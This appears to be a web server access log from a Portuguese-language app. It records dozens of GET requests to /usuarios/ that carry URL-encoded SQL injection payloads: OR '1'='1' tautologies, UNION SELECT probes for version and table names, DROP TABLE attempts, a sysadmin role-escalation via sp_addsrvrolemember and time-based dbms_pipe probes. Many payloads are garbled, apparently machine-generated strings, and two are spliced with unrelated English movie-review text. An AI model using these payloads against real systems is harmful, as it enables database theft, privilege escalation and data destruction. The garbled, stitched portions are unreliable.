Servidor rodando em http://0.0.0.0:8000
172.18.0.1 - GET /usuarios/test'%20OR%20'1'='1%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20OR%20'1'='1 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20table_name'%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20charaller/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20lys:%20)%20;%20and%20'1'='1 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;(%201,atcom_like%20)%20;%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20select%20@@version,%20)%20/*The%20Personall%20does%20and%20people%20did%20the%20lives%20of%20the%20long%20country%20line%20about%20the%20sense%20but%20found%20bad%20acting,%20but%20it%20wasn't%20too%20bad%20to%20described%20this%20movie%20and%20the HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynot',%20)%20%3Ean/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20;)%20,%20userverall; HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentybel%20lyat';%20)%20'hat',like%20'1 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20,%20as%20trectallyuseri HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20()%20,%20)%20,@@version%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@@@%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(%20char%20(%202bsenchar%20(%20%22(%20)%20+%20(%20select%201%20)%20from%20sysuler%20(%20tas%20)%20/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@(%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(chars%20ly$;,ly,%20)%20'/**/ HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@@verscomance())%20%3C@%20OR%200x376%20NOT%20LIKE%20(SELECT%209876)%20OR%20False HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,alectame%20')%20,%20all_ther%20'1,2,slemp.(elc%20(%20xelec%20(%20lem%20)%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20(%20--%201,',' HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(char.)%20;,%20gencatersenit%20(%20'sbectameritu HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@@verscomand%203)%20LIKE%20'3'%20OR%20'1'='7 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20verseoncmane%20)%20FroM%20tubl_name%20tabchount%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(charentyall%20like%20'ynom',%20)%20,1,1%20)%20)%20;1%20=%201 HTTP/1.1
172.18.0.1 - GET /usuarios/test'%20UNION%20SELECT%20@%20,%20users,made%20(count%20(%20)%20,%20velect%20neme%20persion;%20@@%20)%20,1,1,1,1%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20(%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SE HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20SEM HTTP/1.1
172.18.0.1 - GET /usuarios/test';%20DROP%20TABLE%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test%22%20OR%20%221%22=%221%22%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/testexec%20sp_addsrvrolemember%20'name'%20,%20'sysadmin' HTTP/1.1
172.18.0.1 - GET /usuarios/testselect%20*%20from%20users%20where%20id%20=%201%20or%20%22%20(%20,%22%20=%201%20or%201%20=%201%20--%201 HTTP/1.1
172.18.0.1 - GET /usuarios/test-1700%25'%20or%204149%20=%203391 HTTP/1.1
172.18.0.1 - GET /usuarios/test1'+%20(%20select%20'sbvh'%20where%208539%20=%208539%20and%203707%20=%20(%20select%20count%20(%20*%20)%20from%20sysibm.systables%20as%20t1,sysibm.systables%20as%20t2,sysibm.systables%20as%20t3%20)%20)%20+' HTTP/1.1
172.18.0.1 - GET /usuarios/test1'%20)%20as%20ghvi%20where%203880%20=%203880%20and%204595%20=%204595 HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20where%202267%20=%202267%20and%206537%20=%20dbms_pipe.receive_message%20(%20chr%20(%2076%20)%20%7C%7Cchr%20(%20116%20)%20%7C%7Cchr%20(%20117%20)%20%7C%7Cchr%20(%2065%20)%20,5%20)%20-- HTTP/1.1
172.18.0.1 - GET /usuarios/test1%20)%20where%202790%20=%202790%20and%20(%203020%20=%203020%20)%20*6703--I%20think%20thinks%20will%20surprise.%3Cbr%20/%3E%3Cbr%20/%3EI%20don't%20even%20know%20that%20it%20was%20great%20as%20investigaties.%20The%20acting%20is%20worse%20with%20each%20other.%20This%20is%20the%20only%20reason%20I%20was%20really%20canced.%20The%20previews%20we HTTP/1.1
172.18.0.1 - GET /usuarios/test%60%5D,6/a59qn%5B?%5B3q6v HTTP/1.1
172.18.0.1 - GET /usuarios/test1'))%20as%20pgif%20where%206346=6346;if(7899=7899)%20select%207899%20else%20drop%20function%20zbbp%20-- HTTP/1.1
